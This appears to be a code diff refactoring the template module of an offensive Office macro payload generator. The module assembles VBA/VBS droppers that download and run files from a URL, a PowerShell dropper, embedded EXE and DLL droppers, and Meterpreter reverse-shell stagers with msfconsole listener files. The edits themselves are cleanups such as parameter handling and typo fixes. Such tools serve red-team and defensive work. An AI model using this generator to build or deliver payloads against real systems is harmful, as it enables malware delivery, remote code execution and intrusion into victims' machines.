@@ -14,8 +14,7 @@ import vbLib.ExecuteCMDSync
 import vbLib.templates
 import vbLib.WmiExec
 from common.utils import MSTypes, MPParam, getParamValue
-from collections import OrderedDict
-from common import  utils
+from common import utils
 
 
 
@@ -36,7 +35,7 @@ class TemplateFactory(MpModule):
             os.remove(cmdFile)
             logging.info("   [-] OK!") 
         else:
-            logging.warn("   [!] No input value was provided for this template.\n       Use \"-t help\" option for help on templates.")
+            logging.warning("   [!] No input value was provided for this template.\n       Use \"-t help\" option for help on templates.")
         
         # Create module
         vbaFile = self.addVBAModule(content)
@@ -46,14 +45,15 @@ class TemplateFactory(MpModule):
     
     def _processCmdTemplate(self):
         """ cmd execute template builder """
-        paramDict = OrderedDict([("Command line",None)]) 
-        self.fillInputParams(paramDict)
-        self.mpSession.dosCommand =  paramDict["Command line"]     
+
+        paramArray = [MPParam("Command line")]
+        self.fillInputParams(paramArray)
+        self.mpSession.dosCommand = getParamValue(paramArray, "Command line")
         
         # add execution functions
         self.addVBLib(vbLib.WscriptExec)
-        self.addVBLib(vbLib.WmiExec )
-        self.addVBLib(vbLib.ExecuteCMDAsync )
+        self.addVBLib(vbLib.WmiExec)
+        self.addVBLib(vbLib.ExecuteCMDAsync)
         
         content = vbLib.templates.CMD
         if self.mpSession.mpType == "Community":
@@ -80,7 +80,7 @@ class TemplateFactory(MpModule):
             
             strsplitted = result.split("%" + substring + "%")
             result = 'Environ("%s")' % substring
-            if strsplitted[0] == "" and strsplitted[1]!="": # we need to apped value to environment variable
+            if strsplitted[0] == "" and strsplitted[1]!="": # we need to append value to environment variable
                 result = result + '\n    realPath = realPath &  "%s" ' % strsplitted[1]
             elif strsplitted[0] != "" and strsplitted[1]=="": # we need to prepend value to environment variable
                 result = result + '\n    realPath = "%s" & realPath ' % strsplitted[0]
@@ -90,7 +90,7 @@ class TemplateFactory(MpModule):
         else:
             result = '"' + result + '"'
 
-        # If there is no path where puting the payload in %temp%
+        # If there is no path where putting the payload in %temp%
         if "\\" not in result and "/" not in result:
             logging.info("   [-] File will be dropped in %%temp%% as %s" % targetPath)
             result = result + '\n    realPath = Environ("TEMP") & "\\" & realPath'
@@ -107,19 +107,19 @@ class TemplateFactory(MpModule):
         # Get required parameters
         realPathKey = "File name in TEMP or full file path (environment variables can be used)."            
         paramArray = [MPParam("target_url"),MPParam(realPathKey,optional=True)]  
-        self.fillInputParams2(paramArray)
+        self.fillInputParams(paramArray)
         downloadPath = getParamValue(paramArray, realPathKey)
         targetUrl = getParamValue(paramArray, "target_url")
 
         # build target path
         if downloadPath == "":
-            downloadPath =  utils.randomAlpha(8)  + os.path.splitext(targetUrl)[1]     
+            downloadPath =  utils.randomAlpha(8) + os.path.splitext(targetUrl)[1]
         downloadPath = self._targetPathToVba(downloadPath)
 
         # Add required functions
         self.addVBLib(vbLib.WscriptExec)
-        self.addVBLib(vbLib.WmiExec )
-        self.addVBLib(vbLib.ExecuteCMDAsync )
+        self.addVBLib(vbLib.WmiExec)
+        self.addVBLib(vbLib.ExecuteCMDAsync)
         
         content = vbLib.templates.DROPPER
         content = content.replace("<<<URL>>>", targetUrl)
@@ -136,19 +136,19 @@ class TemplateFactory(MpModule):
         # Get required parameters
         realPathKey = "File name in TEMP or full file path (environment variables can be used)."            
         paramArray = [MPParam("target_url"),MPParam(realPathKey,optional=True)]  
-        self.fillInputParams2(paramArray)
+        self.fillInputParams(paramArray)
         downloadPath = getParamValue(paramArray, realPathKey)
         targetUrl = getParamValue(paramArray, "target_url")
 
         # build target path
         if downloadPath == "":
-            downloadPath =  utils.randomAlpha(8)  + os.path.splitext(targetUrl)[1]    
+            downloadPath =  utils.randomAlpha(8) + os.path.splitext(targetUrl)[1]
         downloadPath = self._targetPathToVba(downloadPath)
             
         # Add required functions
         self.addVBLib(vbLib.WscriptExec)
-        self.addVBLib(vbLib.WmiExec )
-        self.addVBLib(vbLib.ExecuteCMDAsync )
+        self.addVBLib(vbLib.WmiExec)
+        self.addVBLib(vbLib.ExecuteCMDAsync)
 
         content = vbLib.templates.DROPPER2
         content = content.replace("<<<URL>>>", targetUrl)
@@ -163,16 +163,16 @@ class TemplateFactory(MpModule):
     def _processPowershellDropperTemplate(self):
         """ Generate  code based on powershell DROPPER template  """
         # Get required parameters
-        paramDict = OrderedDict([("powershell_script_url",None)])      
-        self.fillInputParams(paramDict)
+        paramArray = [MPParam("powershell_script_url")]
+        self.fillInputParams(paramArray)
 
         # Add required functions
         self.addVBLib(vbLib.WscriptExec)
-        self.addVBLib(vbLib.WmiExec )
-        self.addVBLib(vbLib.ExecuteCMDAsync )
+        self.addVBLib(vbLib.WmiExec)
+        self.addVBLib(vbLib.ExecuteCMDAsync)
 
         content = vbLib.templates.DROPPER_PS
-        content = content.replace("<<<POWERSHELL_SCRIPT_URL>>>", paramDict["powershell_script_url"])
+        content = content.replace("<<<POWERSHELL_SCRIPT_URL>>>", getParamValue(paramArray, "powershell_script_url"))
         # generate random file name
         vbaFile = self.addVBAModule(content)
         
@@ -183,16 +183,16 @@ class TemplateFactory(MpModule):
     def _processEmbedExeTemplate(self):
         """ Drop and execute embedded file """
         paramArray = [MPParam("Command line parameters",optional=True)]  
-        self.fillInputParams2(paramArray)
+        self.fillInputParams(paramArray)
         # generate random file name
-        fileName = utils.randomAlpha(7)  + os.path.splitext(self.mpSession.embeddedFilePath)[1]
+        fileName = utils.randomAlpha(7) + os.path.splitext(self.mpSession.embeddedFilePath)[1]
        
         logging.info("   [-] File extraction path: %%temp%%\\%s" % fileName)
 
         # Add required functions
         self.addVBLib(vbLib.WscriptExec)
-        self.addVBLib(vbLib.WmiExec )
-        self.addVBLib(vbLib.ExecuteCMDAsync )
+        self.addVBLib(vbLib.WmiExec)
+        self.addVBLib(vbLib.ExecuteCMDAsync)
         content = vbLib.templates.EMBED_EXE
         content = content.replace("<<<FILE_NAME>>>", fileName)
         if getParamValue(paramArray, "Command line parameters") != "":
@@ -206,12 +206,12 @@ class TemplateFactory(MpModule):
     
     
     def _processDropperDllTemplate(self):
-        paramDict = OrderedDict([("URL", None),("Dll_Function",None)])      
-        self.fillInputParams(paramDict)  
-        dllUrl=paramDict["URL"] 
-        dllFct=paramDict["Dll_Function"]   
+        paramArray = [MPParam("URL"), MPParam("Dll_Function")]
+        self.fillInputParams(paramArray)
+        dllUrl=getParamValue(paramArray, "URL")
+        dllFct=getParamValue(paramArray, "Dll_Function")
 
-        if self.outputFileType in [ MSTypes.HTA, MSTypes.VBS, MSTypes.WSF, MSTypes.SCT, MSTypes.XSL]:
+        if self.outputFileType in [MSTypes.HTA, MSTypes.VBS, MSTypes.WSF, MSTypes.SCT, MSTypes.XSL]:
             # for VBS based file
             content = vbLib.templates.DROPPER_DLL_VBS
             content = content.replace("<<<DLL_URL>>>", dllUrl)
@@ -250,22 +250,22 @@ class TemplateFactory(MpModule):
     
     
     def _processEmbedDllTemplate(self):
-        # open file containing template values       
-        paramDict = OrderedDict([("Dll_Function",None)])      
-        self.fillInputParams(paramDict)
+        # open file containing template values
+        paramArray = [MPParam("Dll_Function")]
+        self.fillInputParams(paramArray)
             
         #logging.info("   [-] Dll will be dropped at: %s" % extractedFilePath)
-        if self.outputFileType in [ MSTypes.VBSCRIPTS_FORMATS ]:
+        if self.outputFileType in [MSTypes.VBSCRIPTS_FORMATS]:
             # for VBS based file
             content = vbLib.templates.EMBED_DLL_VBS
-            content = content.replace("<<<DLL_FUNCTION>>>", paramDict["Dll_Function"])
+            content = content.replace("<<<DLL_FUNCTION>>>", getParamValue(paramArray, "Dll_Function"))
             vbaFile = self.addVBAModule(content)
             logging.debug("   [-] Template %s VBS generated in %s" % (self.template, vbaFile))
         else:
             # for VBA based files
             # generate main module 
             content = vbLib.templates.DROPPER_DLL2
-            content = content.replace("<<<DLL_FUNCTION>>>", paramDict["Dll_Function"])
+            content = content.replace("<<<DLL_FUNCTION>>>", getParamValue(paramArray, "Dll_Function"))
             invokerModule = self.addVBAModule(content)
             logging.debug("   [-] Template %s VBA generated in %s" % (self.template, invokerModule)) 
             
@@ -293,12 +293,13 @@ class TemplateFactory(MpModule):
     
     def _processMeterpreterTemplate(self):
         """ Generate meterpreter template for VBA and VBS based """
-        paramDict = OrderedDict([("rhost",None), ("rport",None) ])      
-        self.fillInputParams(paramDict)
+
+        paramArray = [MPParam("rhost"), MPParam("rport")]
+        self.fillInputParams(paramArray)
          
         content = vbLib.templates.METERPRETER
-        content = content.replace("<<<RHOST>>>", paramDict["rhost"])
-        content = content.replace("<<<RPORT>>>", paramDict["rport"])
+        content = content.replace("<<<RHOST>>>", getParamValue(paramArray, "rhost"))
+        content = content.replace("<<<RPORT>>>", getParamValue(paramArray, "rport"))
         if self.outputFileType in MSTypes.VBSCRIPTS_FORMATS:
             content = content + vbLib.Meterpreter.VBS
         else:
@@ -306,15 +307,15 @@ class TemplateFactory(MpModule):
         vbaFile = self.addVBAModule(content)
         logging.debug("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
         rc_content = vbLib.templates.METERPRETER_RC
-        rc_content = rc_content.replace("<<<LHOST>>>", paramDict["rhost"])
-        rc_content = rc_content.replace("<<<LPORT>>>", paramDict["rport"])
+        rc_content = rc_content.replace("<<<LHOST>>>", getParamValue(paramArray, "rhost"))
+        rc_content = rc_content.replace("<<<LPORT>>>", getParamValue(paramArray, "rport"))
         # Write in RC file
         rcFilePath = os.path.join(os.path.dirname(self.outputFilePath), "meterpreter.rc")
         f = open(rcFilePath, 'w')
         f.writelines(rc_content)
         f.close()
-        logging.info("   [-] Meterpreter resource file generated in %s" % (rcFilePath)) 
-        logging.info("   [-] Execute lisetener with 'msfconsole -r %s'" % (rcFilePath)) 
+        logging.info("   [-] Meterpreter resource file generated in %s" % rcFilePath)
+        logging.info("   [-] Execute listener with 'msfconsole -r %s'" % rcFilePath)
         logging.info("   [-] OK!")
         
         
@@ -323,27 +324,27 @@ class TemplateFactory(MpModule):
         """ 
         Generate reverse https meterpreter template for VBA and VBS based  
         """
-        paramDict = OrderedDict([("rhost",None), ("rport",None) ])
-        self.fillInputParams(paramDict)
+        paramArray = [MPParam("rhost"), MPParam("rport")]
+        self.fillInputParams(paramArray)
 
         content = vbLib.templates.WEBMETER
-        content = content.replace("<<<RHOST>>>", paramDict["rhost"])
-        content = content.replace("<<<RPORT>>>", paramDict["rport"])
+        content = content.replace("<<<RHOST>>>", getParamValue(paramArray, "rhost"))
+        content = content.replace("<<<RPORT>>>", getParamValue(paramArray, "rport"))
         content = content + vbLib.WebMeter.VBA
 
         vbaFile = self.addVBAModule(content)
         logging.debug("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
         
         rc_content = vbLib.templates.WEBMETER_RC
-        rc_content = rc_content.replace("<<<LHOST>>>", paramDict["rhost"])
-        rc_content = rc_content.replace("<<<LPORT>>>", paramDict["rport"])
+        rc_content = rc_content.replace("<<<LHOST>>>", getParamValue(paramArray, "rhost"))
+        rc_content = rc_content.replace("<<<LPORT>>>", getParamValue(paramArray, "rport"))
         # Write in RC file
         rcFilePath = os.path.join(os.path.dirname(self.outputFilePath), "webmeter.rc")
         f = open(rcFilePath, 'w')
         f.writelines(rc_content)
         f.close()
-        logging.info("   [-] Meterpreter resource file generated in %s" % (rcFilePath)) 
-        logging.info("   [-] Execute lisetener with 'msfconsole -r %s'" % (rcFilePath)) 
+        logging.info("   [-] Meterpreter resource file generated in %s" % rcFilePath)
+        logging.info("   [-] Execute listener with 'msfconsole -r %s'" % rcFilePath)
         logging.info("   [-] OK!")
         
  
@@ -369,7 +370,7 @@ class TemplateFactory(MpModule):
             self._processCmdTemplate()
             return True
         elif self.template == "REMOTE_CMD":
-            self.addVBLib(vbLib.ExecuteCMDSync )
+            self.addVBLib(vbLib.ExecuteCMDSync)
             content = vbLib.templates.REMOTE_CMD
         elif self.template == "EMBED_EXE":
             self._processEmbedExeTemplate()
@@ -380,7 +381,7 @@ class TemplateFactory(MpModule):
         elif self.template == "DROPPER_DLL":
             self._processDropperDllTemplate()
             return True
-        else: # if not one of default template suppose its a custom template
+        else: # if not one of default template suppose it is a custom template
             if os.path.isfile(self.template):
                 f = open(self.template, 'r')
                 content = f.read()
@@ -396,6 +397,6 @@ class TemplateFactory(MpModule):
     
     def run(self):
         logging.info(" [+] Generating source code from template...")
-        self._generation()
+        return self._generation()
         
 
